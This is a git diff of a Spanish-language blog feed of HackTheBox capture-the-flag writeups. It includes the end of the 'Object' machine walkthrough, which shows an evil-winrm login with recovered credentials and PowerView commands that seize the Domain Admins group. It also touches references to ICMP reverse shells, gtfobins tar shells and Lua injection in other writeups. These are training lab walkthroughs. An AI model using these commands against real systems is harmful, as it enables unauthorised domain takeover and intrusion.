+&lt;p&gt;Probamos las contraseña y obtenemos nuevas credenciales validas, &lt;code&gt;maria:W3llcr4ft3d_4cls&lt;/code&gt;, nos conectamos y ahora somos el usuario &lt;code&gt;maria&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.11.132 -u 'maria' -p 'W3llcr4ft3d_4cls'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\maria\Documents&amp;gt; whoami
+object\maria
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora como maria vemos que tenemos el privilegio de &lt;code&gt;WriteOwner&lt;/code&gt; sobre &lt;code&gt;Domain Admins&lt;/code&gt; y ya con esto podriamos asignarnos el grupo &lt;code&gt;Domain Admins&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/ob8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si vemos el &lt;code&gt;abuse info&lt;/code&gt; nuevamente podemos ver que nos indica una forma en la que podemos hacerlo, para ello vamos a ejecutar lo siguiente, pero no sin antes volver a importar el &lt;code&gt;PowerView.ps1&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/ob9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\ProgramData\Privesc&amp;gt; Import-Module .\PowerView.ps1
+*Evil-WinRM* PS C:\ProgramData\Privesc&amp;gt; Set-DomainObjectOwner -Identity &quot;Domain Admins&quot; -OwnerIdentity maria
+*Evil-WinRM* PS C:\ProgramData\Privesc&amp;gt; Add-DomainObjectAcl -TargetIdentity &quot;Domain Admins&quot; -Rights All -PrincipalIdentity maria
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos los grupos del usuario &lt;code&gt;maria&lt;/code&gt; y ya se encuentra en &lt;code&gt;Domain Admins&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\ProgramData\Privesc&amp;gt; net user maria
+User name                    maria
+Full Name                    maria garcia
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/21/2021 9:16:32 PM
+Password expires             Never
+Password changeable          10/22/2021 9:16:32 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 C:\ProgramData\Privesc\test.ps1
+User profile
+Home directory
+Last logon                   10/26/2023 2:25:15 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Admins        *Domain Users
+The command completed successfully.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora tendriamos que volver a conectarnos para actualizar los permisos, dirigirnos al directorio personal del usuario &lt;code&gt;Administrator&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.11.132 -u 'maria' -p 'W3llcr4ft3d_4cls'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\maria\Documents&amp;gt; cd C:\Users\Administrator\Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; type root.txt
+923cbfd8245771bc2a485f96fb451072
+&lt;/code&gt;&lt;/pre&gt;
+
+</description>
+        <pubDate>Thu, 26 Oct 2023 00:00:00 -0500</pubDate>
+        <link>http://localhost:4000/hackthebox/htb-writeup-Object</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Object</guid>
+        
+        <category>Active Directory</category>
+        
+        <category>Jenkins Exploitation (New Job + Abusing Build Periodically)</category>
+        
+        <category>Jenkins Exploitation (Abusing Trigger builds remotely using TOKEN)</category>
+        
+        <category>Firewall Enumeration Techniques</category>
+        
+        <category>Jenkins Password Decrypt</category>
+        
+        <category>BloodHound Enumeration</category>
+        
+        <category>Abusing ForceChangePassword with PowerView</category>
+        
+        <category>Abusing GenericWrite (Set-DomainObject - Setting Script Logon Path)</category>
+        
+        <category>Abusing WriteOwner (Takeover Domain Admins Group)</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
     
       <item>
         <title>Maquina Minion - htb writeup</title>
@@ -15,7 +518,7 @@
 
 &lt;p&gt;Maquina muy guapa asi que vamos a darle!.&lt;/p&gt;
 
-&lt;p&gt;Comenzamos como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;
+&lt;p&gt;Comenzamos como es de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Minion
 ❯ ls
@@ -204,7 +707,7 @@ tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 &lt;p&gt;Pero podriamos entablarnos una &lt;code&gt;reverse shell&lt;/code&gt; por &lt;code&gt;ICMP&lt;/code&gt; ya que tenemos traza con nuestra maquina, para ello vamos a usar el script &lt;code&gt;Invoke-PowerShellIcmp.ps1&lt;/code&gt; del repositorio de &lt;code&gt;nishang&lt;/code&gt;:&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1&quot;&gt;https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1&quot;&gt;Invoke-PowerShellIcmp.ps1&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;Cateamos el script y vemos que necesitamos ejecutar dos comandos y uno de ellos ejecuta el script &lt;code&gt;icmpsh_m.py&lt;/code&gt; que necesitamos descargar.&lt;/p&gt;
@@ -214,7 +717,7 @@ tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 &lt;p&gt;Nos descargamos el archivo y ejecutamos los comandos.&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py&quot;&gt;https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py&quot;&gt;icmpsh_m.py&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;Ahora para evitar problemas en el script &lt;code&gt;Invoke-PowerShellIcmp.ps1&lt;/code&gt; vamos a quitar todos los comentarios, tambien las lineas vacias y agregar al final &lt;code&gt;Invoke-PowerShellIcmp -IPAddress 10.10.16.10&lt;/code&gt;, para que al interpretarse ejecute la instrucción.&lt;/p&gt;
@@ -1033,7 +1536,7 @@ d-----         1/3/2020   5:28 AM                WindowsPowerShell
 &lt;p&gt;Lo que tenemos que hacer primero es descargarnos el &lt;code&gt;AdDecrypt.zip&lt;/code&gt; del repositorio de &lt;code&gt;github&lt;/code&gt;.&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/VbScrub/AdSyncDecrypt/releases&quot;&gt;https://github.com/VbScrub/AdSyncDecrypt/releases&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/VbScrub/AdSyncDecrypt/releases&quot;&gt;AdSyncDecrypt - releases&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;Lo descomprimimos y dentro vamos a tener dos archivos los cuales tenemos que subir a la maquina victima.&lt;/p&gt;
@@ -1515,7 +2018,7 @@ a5bdfec1b06f0a66536a4227d3dfc27d
 &lt;p&gt;y puedes descargar un release de &lt;code&gt;bloodhound&lt;/code&gt; directamente del repositorio de github:&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound/releases&quot;&gt;https://github.com/BloodHoundAD/BloodHound/releases&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound/releases&quot;&gt;BloodHound - releases&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;Una vez instalado ejecuta el comando &lt;code&gt;neo4j console&lt;/code&gt; y te desplegara el servicio web en el puerto 7474, entras al servicio con las credenciales por defecto &lt;code&gt;neo4j:no4oj&lt;/code&gt; y te pedira cambies la contraseña por defecto a la que desees.&lt;/p&gt;
@@ -1539,7 +2042,7 @@ Starting Neo4j.
 &lt;p&gt;Ahora descargaremos el script de powershell &lt;code&gt;sharphound.ps1&lt;/code&gt; que se va a encargar de recolectar toda la información del equipo en un archivo comprimido, el cual subiremos al &lt;code&gt;bloodhound&lt;/code&gt;.&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1&quot;&gt;https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1&quot;&gt;SharpHound.ps1&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;Subimos el script y lo interpretamos con &lt;code&gt;Iex&lt;/code&gt;.&lt;/p&gt;
@@ -1637,10 +2140,10 @@ The command completed successfully.
 Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; $Cred = New-Object System.Management.Automation.PSCredential('htb.local\fmiracle', $SecPassword)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;Despues vamos a descargarnos e importar el modulo de &lt;code&gt;PowerView.ps1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Despues vamos a descargarnos e importar el modulo de &lt;code&gt;PowerView.ps1&lt;/code&gt;.&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&quot;&gt;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&quot;&gt;PowerView.ps1&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
@@ -2215,7 +2718,7 @@ __init__.py  application.py  data  dev-1514134201.tar.gz  models.py  static  tem
 &lt;p&gt;Si usamos nuestra web de confianza:&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/gtfobins/tar/#shell&quot;&gt;https://gtfobins.github.io/gtfobins/tar/#shell&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/gtfobins/tar/#shell&quot;&gt;gtfobins - tar&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;Vemos que para obtener una shell, podemos hacerlo con los siguientes parametros.&lt;/p&gt;
@@ -2581,7 +3084,7 @@ http://10.10.10.237 [200 OK] Apache[2.4.46], Bootstrap, Country[RESERVED][ZZ], E
 &lt;p&gt;Te dejo el articulo para que puedas entenderlo mejor:&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html&quot;&gt;https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html&quot;&gt;electron-updater-update-signature-bypass&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Atom/atom3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
@@ -3177,7 +3680,7 @@ if __name__ == '__main__':
 &lt;p&gt;Si ahora investigamos un poco existe una vulnerabilidad de la cual nos podemos aprovechar a traves de la &lt;code&gt;regex&lt;/code&gt;, te dejo aqui un articulo para que lo revises a mayor detalle:&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace&quot;&gt;https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace&quot;&gt;the_unexpected_dangers_of_preg_replace&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;Basicamente si le agregamos &lt;code&gt;e&lt;/code&gt; en la regex, podemos ejecutar codigo &lt;code&gt;php&lt;/code&gt;.&lt;/p&gt;
@@ -4748,7 +5251,7 @@ done
 &lt;p&gt;Para ello primero debemos crearnos un archivo &lt;code&gt;reverse.yml&lt;/code&gt; malicioso que nos ejecute un comando, es simple pero puedes guiarte de la documentación para entenderlo mejor.&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html&quot;&gt;https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html&quot;&gt;ansible-builtin-command-module&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/opt/automation/tasks$ cat reverse.yml 
@@ -5609,531 +6112,6 @@ cat root.txt
         <category>SUID Binary Explotation</category>
         
         <category>Buffer Overflow</category>
-        
-        
-        <category>hackthebox</category>
-        
-      </item>
-    
-      <item>
-        <title>Maquina Luanne - htb writeup</title>
-        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Luanne&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad facil, para poder comprometer la maquina nos aprovecharemos de una ruta expuesta con una api en &lt;code&gt;JSON&lt;/code&gt; donde con la ayuda de &lt;code&gt;burpsuite&lt;/code&gt; aprovecharemos el uso de parametros para causar una inyección en &lt;code&gt;lua&lt;/code&gt; con la que ganaremos acceso a la maquina, despues aprovecharemos de un parametro de un servicio de &lt;code&gt;httpd&lt;/code&gt; que corre en &lt;code&gt;NETBSD&lt;/code&gt; obteniendo una clave publica con la que ganaremos acceso como un usario con mayores privilegios y finalmente en un comprimido que lograremos desencriptar obtendremos la contraseña del usuario &lt;code&gt;root&lt;/code&gt; y habremos comprometido el sistema.&lt;/p&gt;
-
-&lt;p&gt;Esta maquina es divertida asi que a darle!.&lt;/p&gt;
-
-&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Luanne
-❯ ls
- Luanne
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
-mkt () {
-	mkdir {nmap,content,exploits,scripts}
-}
-❯ mkt
-❯ ls
- content   exploits   nmap   scripts
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.218
-PING 10.10.10.218 (10.10.10.218) 56(84) bytes of data.
-64 bytes from 10.10.10.218: icmp_seq=1 ttl=254 time=123 ms
-
---- 10.10.10.218 ping statistics ---
-1 packets transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 122.913/122.913/122.913/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;254&lt;/code&gt; y contando el salto al ser &lt;code&gt;255&lt;/code&gt;, podemos usar siguiente pagina para saber a que posiblemente nos estamos enfrentando, que en este caso podria corresponder a un &lt;code&gt;NetBSD&lt;/code&gt;. Mas adelante cuando comprometamos la maquina validaremos si es correcto.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://subinsb.com/default-device-ttl-values/&quot;&gt;https://subinsb.com/default-device-ttl-values/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.218 -oG openPorts
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 16:31 GMT
-Initiating SYN Stealth Scan at 16:31
-Scanning 10.10.10.218 [65535 ports]
-Discovered open port 80/tcp on 10.10.10.218
-Discovered open port 22/tcp on 10.10.10.218
-Discovered open port 9001/tcp on 10.10.10.218
-Completed SYN Stealth Scan at 16:32, 26.67s elapsed (65535 total ports)
-Nmap scan report for 10.10.10.218
-Host is up, received user-set (0.28s latency).
-Scanned at 2023-06-29 16:31:40 GMT for 27s
-Not shown: 62926 filtered tcp ports (no-response), 2606 closed tcp ports (reset)
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-PORT     STATE SERVICE    REASON
-22/tcp   open  ssh        syn-ack ttl 63
-80/tcp   open  http       syn-ack ttl 63
-9001/tcp open  tor-orport syn-ack ttl 63
-
-Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 26.83 seconds
-           Raw packets sent: 129915 (5.716MB) | Rcvd: 2611 (104.460KB)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80,9001 10.10.10.218 -oN targeted
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 16:33 GMT
-Nmap scan report for 10.10.10.218
-Host is up (0.27s latency).
-
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
-| ssh-hostkey: 
-|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
-|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
-|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
-80/tcp   open  http    nginx 1.19.0
-| http-robots.txt: 1 disallowed entry 
-|_/weather
-|_http-server-header: nginx/1.19.0
-|_http-title: 401 Unauthorized
-| http-auth: 
-| HTTP/1.1 401 Unauthorized\x0D
-|_  Basic realm=.
-9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
-|_http-title: Error response
-| http-auth: 
-| HTTP/1.1 401 Unauthorized\x0D
-|_  Basic realm=default
-|_http-server-header: Medusa/1.12
-Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 190.40 seconds
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Podemos ver que nmap nos reporta dos rutas validas &lt;code&gt;robots&lt;/code&gt; y &lt;code&gt;weather&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Visulizamos información interesante de los puertos escaneados y que el equipo corresponde a una maquina &lt;code&gt;Windows 7&lt;/code&gt;:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Puerto&lt;/th&gt;
-      &lt;th&gt;Servicio&lt;/th&gt;
-      &lt;th&gt;Versión&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;22&lt;/td&gt;
-      &lt;td&gt;SSH&lt;/td&gt;
-      &lt;td&gt;OpenSSH 8.0&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;80&lt;/td&gt;
-      &lt;td&gt;HTTP&lt;/td&gt;
-      &lt;td&gt;nginx 1.19.0&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;9001&lt;/td&gt;
-      &lt;td&gt;TOR-ORPORT&lt;/td&gt;
-      &lt;td&gt;Medusa httpd 1.12&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Comenzamos usando &lt;code&gt;whatweb&lt;/code&gt;, para determinar las tecnologias que esta usando el servicio web.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.218
-http://10.10.10.218 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[nginx/1.19.0], IP[10.10.10.218], Title[401 Unauthorized], WWW-Authenticate[.][Basic], nginx[1.19.0]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;La herramienta nos reporta &lt;code&gt;unathorized&lt;/code&gt;, en otras palabras nos solicita credenciales.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.218:9001
-http://10.10.10.218:9001 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Medusa/1.12], IP[10.10.10.218], Title[Error response], WWW-Authenticate[default][Basic]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vamos a proceder Abrimos el servicio con el navegador y vemos que efectivamente nos solicita credenciales para ingresar y si intentamos usar credenciales por defecto no conseguimos ingresar.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Lo siguiente que haremos sera dirigirnos a la ruta que nmap nos reporto &lt;code&gt;robots.txt&lt;/code&gt; y podemos ver que dentro la ruta &lt;code&gt;weather&lt;/code&gt; esta desabilitada.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ya que la ruta se reporta como desabilitada, vamos a suponer que existe y con &lt;code&gt;wfuzz&lt;/code&gt; vamos a tratar de fuzear por archivos dentro de esa ruta.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.218/weather/FUZZ
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://10.10.10.218/weather/FUZZ
-Total requests: 220560
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                                               
-=====================================================================
-
-000007114:   200        1 L      12 W       90 Ch       &quot;forecast&quot;                                                                                                            
-000015529:   404        7 L      11 W       153 Ch      &quot;hitb&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Despues de aplicar fuzzing, vemos que existe una ruta &lt;code&gt;forecast&lt;/code&gt; que si la visualizamos tenemos acceso a una api &lt;code&gt;json&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En el mensaje vemos que nos pide usar un paramatro, para poder listar las ciudades.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como vemos que se estan usando parametros, vamos a pasar la petición por &lt;code&gt;burpsuite&lt;/code&gt; para tratar de realizar inyecciones en la petición que nos permitan aprovecharnos de esta, asi que mandamos la petición con ayuda de &lt;code&gt;foxyproxy&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Recibimos la petición en &lt;code&gt;burpsuite&lt;/code&gt; y la mandamos al repeater.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora trataremos de realizar una inyección en la petición incorporando una &lt;code&gt;'&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ocasionamos un&lt;code&gt;luaerror&lt;/code&gt;, asi que podemos tratar de ejecutar un comando con &lt;code&gt;lua&lt;/code&gt;, usando &lt;code&gt;os.execute()&lt;/code&gt;. y comentando la query.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
